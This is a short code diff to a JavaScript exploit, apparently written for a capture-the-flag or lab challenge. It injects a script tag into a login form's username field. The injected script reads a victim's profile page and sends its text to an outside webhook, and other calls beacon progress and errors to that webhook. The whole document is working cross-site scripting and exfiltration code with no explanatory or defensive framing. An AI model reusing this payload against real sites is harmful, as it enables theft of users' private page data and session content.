@@ -17,7 +17,8 @@ function post(url, data) {
 }
 
 function imgEnd() {
-  window.open(PROFILE, OPEN);
+  post(WEBHOOK, "end");
+  window.location = PROFILE;
 }
 
 // const queryString = window.location.search;
@@ -28,16 +29,13 @@ try {
   window.open(PROFILE, OPEN);
 
   const payload = `
-let xhr = new XMLHttpRequest();
-xhr.open("POST", "${WEBHOOK}?imin", false);
-xhr.send(null);
 const profile = window.open("", "${OPEN}");
 window.location = "${WEBHOOK}?" + profile.document.body.innerText;
 `;
   document.getElementById("username").value = `<script>${payload}</script>`;
   document.getElementById("login").submit();
 
-  setTimeout(() => imgEnd(), 2000);
+  setTimeout(() => imgEnd(), 3000);
 } catch (error) {
   post(WEBHOOK, `Error: ${error}`);
 }
